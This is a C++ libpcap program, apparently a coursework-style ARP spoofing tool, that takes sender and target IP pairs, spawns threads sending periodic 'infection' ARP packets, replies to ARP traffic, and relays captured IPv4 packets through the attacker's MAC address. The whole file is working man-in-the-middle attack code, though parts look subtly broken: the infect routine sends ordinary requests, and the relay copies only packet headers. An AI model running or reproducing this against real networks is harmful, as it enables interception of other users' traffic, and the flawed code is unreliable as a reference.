#include <pcap.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <ifaddrs.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <map>
#include <thread>
#include <vector>
#include <cstring>
#include <chrono>

std::map<std::string, std::string> IP_GATE;
std::map<Ip, Mac> TABLE2;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

char errbuf[PCAP_ERRBUF_SIZE];
unsigned char MY_MAC[6];
char MY_IP[INET_ADDRSTRLEN];

struct ipheader {
    unsigned char iph_ihl : 4, iph_ver : 4;
    unsigned char iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_flag : 3, iph_offset : 13;
    unsigned char iph_ttl;
    unsigned char iph_protocol;
    unsigned short int iph_chksum;
    struct in_addr iph_sourceip;
    struct in_addr iph_destip;
};

int get_wlan_ip(char* ifname, char* ip) {
    struct ifaddrs* ifaddr, * ifa;
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (strncmp(ifa->ifa_name, ifname, 4) == 0) {
            if (ifa->ifa_addr->sa_family == AF_INET) {
                struct sockaddr_in* sa = (struct sockaddr_in*)ifa->ifa_addr;
                inet_ntop(AF_INET, &(sa->sin_addr), ip, INET_ADDRSTRLEN);
                freeifaddrs(ifaddr);
                return 0;
            }
        }
    }
    freeifaddrs(ifaddr);
    return -1;
}

int get_wlan_mac(char* ifname, unsigned char* mac) {
    struct ifaddrs* ifaddr, * ifa;
    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return -1;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;
        if (strncmp(ifa->ifa_name, ifname, 4) == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            if (sock == -1) {
                perror("socket");
                freeifaddrs(ifaddr);
                return -1;
            }

            struct ifreq ifr;
            strncpy(ifr.ifr_name, ifa->ifa_name, IFNAMSIZ - 1);
            ifr.ifr_name[IFNAMSIZ - 1] = '\0';

            if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
                close(sock);
                freeifaddrs(ifaddr);
                return 0;
            }
            else {
                perror("ioctl");
                close(sock);
            }
        }
    }

    freeifaddrs(ifaddr);
    return -1;
}

void sendArpPacket(char* ifname, Ip sender_addr, Ip target_addr, Mac sender_mac, bool is_request) {
    pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", ifname, errbuf);
        return;
    }

    EthArpPacket packet;
    packet.eth_.dmac_ = is_request ? Mac("ff:ff:ff:ff:ff:ff") : sender_mac;
    packet.eth_.smac_ = Mac(MY_MAC);
    packet.eth_.type_ = htons(EthHdr::Arp);
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(is_request ? ArpHdr::Request : ArpHdr::Reply);
    packet.arp_.smac_ = Mac(MY_MAC);
    packet.arp_.sip_ = htonl(sender_addr);
    packet.arp_.tmac_ = is_request ? Mac("00:00:00:00:00:00") : sender_mac;
    packet.arp_.tip_ = htonl(target_addr);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    pcap_close(handle);
}

void continuousArpInfect(char* ifname, char* sender_addr, char* target_addr) {
    while (true) {
        printf("%s, %s init finish\n", sender_addr, target_addr);
        sendArpPacket(ifname, Ip(sender_addr), Ip(target_addr), Mac(), true);
        std::this_thread::sleep_for(std::chrono::seconds(2)); // 주기적으로 감염 패킷 전송
    }
}

int relay_packet(const u_char* packet, char* ifname, char* s_addr, char* d_addr) {
    pcap_t* handle = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", ifname, errbuf);
        return -1;
    }

    size_t packet_len = sizeof(struct EthHdr) + sizeof(struct ipheader);
    u_char* packet1 = (u_char*)malloc(packet_len);
    memcpy(packet1, packet, packet_len);

    struct EthHdr* eth = (struct EthHdr*)packet1;
    eth->smac_ = Mac(MY_MAC); // my MAC FIX

    auto it = TABLE2.find(Ip(d_addr));
    if (it != TABLE2.end()) {
        eth->dmac_ = it->second;
    } else {
        eth->dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // broadcast
    }

    int res = pcap_sendpacket(handle, packet1, packet_len);
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    free(packet1);
    pcap_close(handle);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc - 1) % 2 != 1) {
        printf("Usage: %s <interface> <sender_ip1> <target_ip1> [<sender_ip2> <target_ip2> ...]\n", argv[0]);
        return -1;
    }

    char ifname[100];
    strcpy(ifname, argv[1]);
    get_wlan_mac(ifname, MY_MAC);
    get_wlan_ip(ifname, MY_IP);

    std::vector<std::thread> threads;
    for (int i = 2; i < argc; i += 2) {
        threads.push_back(std::thread(continuousArpInfect, ifname, argv[i], argv[i + 1]));
    }

    for (auto& th : threads) {
        th.detach(); // 스레드를 백그라운드에서 실행
    }

    pcap_t* pcap = pcap_open_live(ifname, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", ifname, errbuf);
        return -1;
    }

    while (true) { // 패킷캡쳐
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        struct EthHdr* eth = (struct EthHdr*)packet;
        if (eth->type() == htons(0x0806)) { // ARP packet
            printf("arp recover packet send!\n");
            sendArpPacket(ifname, Ip(MY_IP), Ip("0.0.0.0"), eth->smac_, false);
        }
        else if (eth->type() == htons(0x0800)) { // IP packet
            printf("this is relay\n");
            struct ipheader* ip_header = (struct ipheader*)(packet + sizeof(struct EthHdr));
            char s_addr[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ip_header->iph_sourceip), s_addr, INET_ADDRSTRLEN);
            char d_addr[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &(ip_header->iph_destip), d_addr, INET_ADDRSTRLEN);

            relay_packet(packet, ifname, s_addr, d_addr);
        }
    }

    return 0;
}

